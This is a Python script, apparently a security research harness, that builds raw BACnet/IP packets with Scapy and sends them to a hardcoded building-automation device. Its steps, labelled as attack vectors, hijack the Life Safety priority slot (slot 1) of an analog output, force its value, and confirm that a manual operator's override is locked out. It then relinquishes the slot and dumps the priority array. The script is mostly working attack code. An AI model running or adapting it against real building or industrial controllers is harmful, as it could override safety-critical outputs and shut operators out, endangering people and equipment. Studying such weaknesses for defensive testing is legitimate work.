import socket
import struct
from scapy.packet import Packet, bind_layers
from scapy.fields import ByteField, ShortField, XByteField
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()

# ----------------------------------------------------------------------
# 1. Scapy Custom BACnet/IP Protocol Layer Definitions
# ----------------------------------------------------------------------

class BVLC(Packet):
    name = "BVLC"
    fields_desc = [
        XByteField("type", 0x81),
        XByteField("function", 0x0A),
        ShortField("length", None)
    ]

    def post_build(self, p, pay):
        if self.length is None:
            l = len(p) + len(pay)
            p = p[:2] + struct.pack("!H", l) + p[4:]
        return p + pay

class NPDU(Packet):
    name = "NPDU"
    fields_desc = [
        ByteField("version", 0x01),
        XByteField("control", 0x04)
    ]

bind_layers(BVLC, NPDU)

# ----------------------------------------------------------------------
# 2. Protocol Lookup Maps
# ----------------------------------------------------------------------

ERROR_CLASSES = {
    0: "device", 1: "object", 2: "property", 3: "resources", 
    4: "security", 5: "services", 6: "definition"
}

ERROR_CODES = {
    0: "other", 31: "unknown-object", 39: "unknown-property",
    40: "value-out-of-range", 43: "write-access-denied",
    49: "no-space-for-object", 50: "dynamic-creation-not-supported"
}

# ----------------------------------------------------------------------
# 3. Pillar 2 Payload Builders (WriteProperty & Priority Selection)
# ----------------------------------------------------------------------

def build_write_property_real(obj_type, obj_instance, prop_id, value, priority=None, invoke_id=1):
    """
    Constructs a WriteProperty (Service 0x0F) request writing a Real (float32) value 
    to a specific property (e.g., Present_Value = 85) with an optional Priority slot (1-16).
    """
    apdu_hdr = struct.pack("!BBB", 0x00, 0x05, invoke_id)
    service = struct.pack("!B", 0x0F)  # WriteProperty

    # Context Tag 0: Object Identifier
    obj_composite = (obj_type << 22) | (obj_instance & 0x3FFFFF)
    tag0 = struct.pack("!BI", 0x0C, obj_composite)

    # Context Tag 1: Property Identifier
    if prop_id <= 255:
        tag1 = struct.pack("!BB", 0x19, prop_id)
    else:
        tag1 = struct.pack("!BH", 0x1A, prop_id)

    # Context Tag 3: Value wrapped in Opening (0x3E) and Closing (0x3F) tags
    # Application Tag 4: Real (float32) -> 0x44 (Tag 4, Len 4)
    open_tag3 = b"\x3e"
    val_tag = struct.pack("!Bf", 0x44, float(value))
    close_tag3 = b"\x3f"

    # Optional Context Tag 4: Priority (1-16) as Unsigned Int (Application Tag 2 -> Context Tag 4 = 0x49)
    tag4 = b""
    if priority is not None:
        tag4 = struct.pack("!BB", 0x49, priority)

    raw_apdu = apdu_hdr + service + tag0 + tag1 + open_tag3 + val_tag + close_tag3 + tag4
    return bytes(BVLC(function=0x0A) / NPDU(control=0x04) / raw_apdu)

def build_write_property_null(obj_type, obj_instance, prop_id, priority, invoke_id=1):
    """
    Constructs a WriteProperty (Service 0x0F) request writing a NULL value 
    to relinquish control at a specific Priority slot (1-16).
    """
    apdu_hdr = struct.pack("!BBB", 0x00, 0x05, invoke_id)
    service = struct.pack("!B", 0x0F)

    obj_composite = (obj_type << 22) | (obj_instance & 0x3FFFFF)
    tag0 = struct.pack("!BI", 0x0C, obj_composite)

    if prop_id <= 255:
        tag1 = struct.pack("!BB", 0x19, prop_id)
    else:
        tag1 = struct.pack("!BH", 0x1A, prop_id)

    # Context Tag 3: Value = NULL (Application Tag 0 -> 0x00)
    open_tag3 = b"\x3e"
    val_tag = b"\x00"
    close_tag3 = b"\x3f"

    # Context Tag 4: Priority Slot
    tag4 = struct.pack("!BB", 0x49, priority)

    raw_apdu = apdu_hdr + service + tag0 + tag1 + open_tag3 + val_tag + close_tag3 + tag4
    return bytes(BVLC(function=0x0A) / NPDU(control=0x04) / raw_apdu)

def build_read_property(obj_type, obj_instance, prop_id, invoke_id=1):
    """
    Constructs a standard ReadProperty (Service 0x0C) request.
    """
    apdu_hdr = struct.pack("!BBB", 0x00, 0x05, invoke_id)
    service = struct.pack("!B", 0x0C)
    
    obj_composite = (obj_type << 22) | (obj_instance & 0x3FFFFF)
    tag0 = struct.pack("!BI", 0x0C, obj_composite)
    
    if prop_id <= 255:
        tag1 = struct.pack("!BB", 0x19, prop_id)
    else:
        tag1 = struct.pack("!BH", 0x1A, prop_id)
        
    return bytes(BVLC(function=0x0A) / NPDU(control=0x04) / (apdu_hdr + service + tag0 + tag1))

# ----------------------------------------------------------------------
# 4. Response Parsers & Tag Decoders
# ----------------------------------------------------------------------

def decode_application_tags(payload_bytes):
    """
    Parses BACnet Application Tags out of ComplexACK payloads (Reals, Strings, Ints, Enums, Nulls).
    """
    results = []
    i = 0
    while i < len(payload_bytes):
        tag_byte = payload_bytes[i]
        tag_number = (tag_byte >> 4) & 0x0F
        length_field = tag_byte & 0x0F
        
        if length_field == 5 and (i + 1) < len(payload_bytes):
            length = payload_bytes[i + 1]
            header_len = 2
        else:
            length = length_field
            header_len = 1

        start = i + header_len
        if start + length > len(payload_bytes):
            i += 1
            continue

        # Tag 0: Null
        if tag_number == 0x0:
            results.append(("Null", "NULL"))
            i += header_len
            continue

        # Tag 2: Unsigned Integer
        elif tag_number == 0x2:
            val_bytes = payload_bytes[start : start + length]
            val = int.from_bytes(val_bytes, byteorder="big")
            results.append(("Unsigned Int", val))
            i += header_len + length
            continue

        # Tag 4: Real (Float32)
        elif tag_number == 0x4 and length == 4:
            val_bytes = payload_bytes[start : start + length]
            val = struct.unpack("!f", val_bytes)[0]
            results.append(("Real", round(val, 2)))
            i += header_len + length
            continue

        # Tag 7: Character String
        elif tag_number == 0x7:
            if length > 1:
                str_bytes = payload_bytes[start + 1 : start + length]
                try:
                    decoded = str_bytes.decode("utf-8", errors="ignore").strip("\x00")
                    if decoded:
                        results.append(("Character String", decoded))
                except Exception:
                    pass
            i += header_len + length
            continue

        i += 1
    return results

def parse_response(data):
    if not data or len(data) < 6:
        return {"type": "Malformed", "raw": data.hex(), "details": "Packet too short"}

    npdu_len = 2
    apdu_offset = 4 + npdu_len
    
    if len(data) <= apdu_offset:
        return {"type": "Malformed", "raw": data.hex(), "details": "Missing APDU payload"}

    apdu_byte = data[apdu_offset]
    apdu_type = (apdu_byte >> 4) & 0x0F

    parsed = {
        "type_id": apdu_type,
        "raw": data.hex(),
        "details": {}
    }

    if apdu_type == 3:  # ComplexACK
        parsed["type"] = "ComplexACK"
        if len(data) > apdu_offset + 2:
            parsed["invoke_id"] = data[apdu_offset + 1]
            parsed["service_choice"] = data[apdu_offset + 2]
            parsed["payload_bytes"] = data[apdu_offset + 3:]

    elif apdu_type == 2:  # SimpleACK
        parsed["type"] = "SimpleACK"
        if len(data) > apdu_offset + 2:
            parsed["invoke_id"] = data[apdu_offset + 1]
            parsed["service_choice"] = data[apdu_offset + 2]

    elif apdu_type == 5:  # Error-PDU
        parsed["type"] = "Error-PDU"
        if len(data) > apdu_offset + 3:
            parsed["invoke_id"] = data[apdu_offset + 1]
            parsed["service_choice"] = data[apdu_offset + 2]
            err_class_idx = data[apdu_offset + 4] if len(data) > apdu_offset + 4 else 0
            err_code_idx = data[apdu_offset + 6] if len(data) > apdu_offset + 6 else 0
            parsed["details"]["error_class"] = ERROR_CLASSES.get(err_class_idx, f"Unknown ({err_class_idx})")
            parsed["details"]["error_code"] = ERROR_CODES.get(err_code_idx, f"Unknown ({err_code_idx})")

    elif apdu_type == 6:  # Reject-PDU
        parsed["type"] = "Reject-PDU"
        if len(data) > apdu_offset + 2:
            parsed["invoke_id"] = data[apdu_offset + 1]
            parsed["details"]["reject_reason"] = data[apdu_offset + 2]

    else:
        parsed["type"] = f"Unknown-APDU ({apdu_type})"

    return parsed

# ----------------------------------------------------------------------
# 5. Pillar 2 Execution Harness
# ----------------------------------------------------------------------

def run_pillar_two_tests():
    target_ip = "192.168.1.196"
    target_port = 47808

    # Testing on Analog Output 1 (obj_type=1, instance=1)
    # Present_Value = 85, Priority_Array = 87, Relinquish_Default = 104
    obj_type = 1
    obj_inst = 1

    console.print(Panel.fit(
        "[bold cyan]Pillar 2: Priority Array & Command Arbitration Research Harness[/bold cyan]\n"
        "[dim]Vectors: Priority Slot Hijacking, Lower-Slot Lockout & Relinquish Default Forcing[/dim]",
        border_style="cyan"
    ))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3.0)

    try:
        # --- Baseline: Read Present_Value ---
        console.print("\n[bold yellow][Step 1] Querying Initial Present_Value (Prop 85)...[/bold yellow]")
        req = build_read_property(obj_type, obj_inst, prop_id=85, invoke_id=1)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        res = parse_response(data)
        if res["type"] == "ComplexACK":
            tags = decode_application_tags(res["payload_bytes"])
            val = tags[0][1] if tags else "Unknown"
            console.print(f"[+] Baseline Present_Value: [bold green]{val}[/bold green]")

        # --- Vector A: Operator Level Write (Slot 16 / HVAC Schedule) ---
        console.print("\n[bold yellow][Vector A] Writing 22.5 to Slot 16 (Operator/Schedule Level)...[/bold yellow]")
        req = build_write_property_real(obj_type, obj_inst, prop_id=85, value=22.5, priority=16, invoke_id=2)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        res = parse_response(data)
        console.print(f"[+] Write Response: [bold green]{res['type']}[/bold green]")

        # --- Vector B: Priority Slot Hijack (Slot 1 / Life Safety Lockout) ---
        console.print("\n[bold yellow][Vector B] Executing Priority Slot Hijack: Writing 99.0 to Slot 1 (Life Safety)...[/bold yellow]")
        req = build_write_property_real(obj_type, obj_inst, prop_id=85, value=99.0, priority=1, invoke_id=3)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        res = parse_response(data)
        console.print(f"[+] Hijack Response: [bold green]{res['type']}[/bold green]")

        # --- Verification: Read Present_Value after Slot 1 Write ---
        req = build_read_property(obj_type, obj_inst, prop_id=85, invoke_id=4)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        res = parse_response(data)
        if res["type"] == "ComplexACK":
            tags = decode_application_tags(res["payload_bytes"])
            val = tags[0][1] if tags else "Unknown"
            console.print(f"[!] Active Present_Value post-hijack: [bold red]{val}[/bold red] (Overridden by Slot 1)")

        # --- Vector C: Operator Override Attempt (Attempting Write to Slot 8 while Slot 1 is Active) ---
        console.print("\n[bold yellow][Vector C] Simulating Operator Override: Writing 50.0 to Slot 8 (Manual Operator)...[/bold yellow]")
        req = build_write_property_real(obj_type, obj_inst, prop_id=85, value=50.0, priority=8, invoke_id=5)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        res = parse_response(data)
        console.print(f"[+] Operator Write Response: [bold green]{res['type']}[/bold green]")

        # Verify state: Output should STILL be locked at 99.0
        req = build_read_property(obj_type, obj_inst, prop_id=85, invoke_id=6)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        res = parse_response(data)
        if res["type"] == "ComplexACK":
            tags = decode_application_tags(res["payload_bytes"])
            val = tags[0][1] if tags else "Unknown"
            console.print(f"[!] Active Present_Value after Operator Write: [bold red]{val}[/bold red] (Lockout Confirmed)")

        # --- Vector D: Relinquish Slot 1 Control ---
        console.print("\n[bold yellow][Vector D] Relinquishing Control on Slot 1 (Writing NULL to Slot 1)...[/bold yellow]")
        req = build_write_property_null(obj_type, obj_inst, prop_id=85, priority=1, invoke_id=7)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        res = parse_response(data)
        console.print(f"[+] Relinquish Response: [bold green]{res['type']}[/bold green]")

        # Verify state: Output should fall back to Slot 8 (50.0)
        req = build_read_property(obj_type, obj_inst, prop_id=85, invoke_id=8)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        res = parse_response(data)
        if res["type"] == "ComplexACK":
            tags = decode_application_tags(res["payload_bytes"])
            val = tags[0][1] if tags else "Unknown"
            console.print(f"[+] Active Present_Value post-relinquish: [bold green]{val}[/bold green] (Arbitrated down to Slot 8)")

        # --- Vector E: Dump Priority_Array (Property 87) ---
        console.print("\n[bold yellow][Vector E] Dumping Full Priority_Array (Property 87)...[/bold yellow]")
        req = build_read_property(obj_type, obj_inst, prop_id=87, invoke_id=9)
        sock.sendto(req, (target_ip, target_port))
        data, _ = sock.recvfrom(4096)
        res = parse_response(data)
        
        if res["type"] == "ComplexACK" and "payload_bytes" in res:
            tags = decode_application_tags(res["payload_bytes"])
            table = Table(title="Priority Array (16 Slots)", header_style="bold magenta")
            table.add_column("Slot", justify="right", style="cyan")
            table.add_column("Designation", style="yellow")
            table.add_column("State / Value", style="green")

            designations = {
                1: "Manual-Life Safety", 2: "Automatic-Life Safety",
                3: "Available", 4: "Available", 5: "Critical Equipment Control",
                6: "Minimum On/Off", 7: "Available", 8: "Manual Operator",
                16: "HVAC Schedule / Lowest"
            }

            for idx, (ttype, val) in enumerate(tags[:16], start=1):
                des = designations.get(idx, "Available / Normal")
                table.add_row(str(idx), des, str(val))
            
            console.print(table)

    except Exception as e:
        console.print(f"[bold red][!] Execution Exception Caught: {e}[/bold red]")
    finally:
        sock.close()
        console.print("\n[dim][*] Socket closed. Pillar 2 research harness execution completed.[/dim]")

if __name__ == "__main__":
    run_pillar_two_tests()